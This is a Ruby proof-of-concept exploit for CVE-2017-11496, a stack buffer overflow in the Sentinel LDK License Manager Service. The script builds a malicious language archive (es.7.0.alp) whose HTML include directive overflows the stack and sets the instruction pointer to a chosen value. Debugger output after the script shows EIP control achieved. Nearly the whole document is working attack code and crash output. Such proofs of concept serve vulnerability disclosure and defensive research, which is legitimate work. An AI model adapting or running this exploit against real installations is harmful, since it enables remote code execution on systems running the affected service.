#!/usr/bin/env ruby
# CVE-2017-11496
# Sentinel LDK License Manager Service (732/17.2.1.51259)

require 'rex'
require 'rex/zip'

localize = %Q|<?xml version="1.0" encoding="UTF-8"?>
<localize>
  <id>es</id>
  <name>Spanish</name>
  <icon>notreached.gif</icon>
  <level>7</level>
  <version>0</version>
  <tslang>Spanish</tslang>
  <tsbuild>Source Build</tsbuild>
  <tsver>7.0</tsver>
  <tsdate>26 Aug 2014</tsdate>
</localize>
|

buffer = Rex::Text.pattern_create(2024)
buffer[1028, 4] = [0xfeedface].pack('V')

exploit = %Q|{#include \"#{buffer}\"}|

zip = Rex::Zip::Archive.new
zip.add_file("localize.xml", localize)
zip.add_file("exploit.html", exploit)
zip.save_to("es.7.0.alp")
__END__
(c5c.c60): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=026fda68 ecx=026fd265 edx=00000001 esi=000007f3 edi=02900028
eip=feedface esp=026fda4c ebp=026fe294 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
feedface ??              ???
0:018> da esp
026fda4c  "Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj"
026fda6c  "4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4B"
026fda8c  "k5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5"
026fdaac  "Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm"
026fdacc  "6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6B"
026fdaec  "n7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7"
026fdb0c  "Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp"
026fdb2c  "8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8B"
026fdb4c  "q9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9"
026fdb6c  "Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt"
026fdb8c  "0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0B"
026fdbac  "u1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1"
0:018> kv
ChildEBP RetAddr  Args to Child              
WARNING: Frame IP not in any known module. Following frames may be wrong.
026fda48 42346942 69423569 37694236 42386942 0xfeedface
*** ERROR: Module load completed but symbols could not be loaded for C:\Windows\system32\hasplms.exe
026fe294 009ce27c 00000049 0000004f 00000000 0x42346942
00000000 00000000 00000000 00000000 00000000 hasplms+0x5ce27c


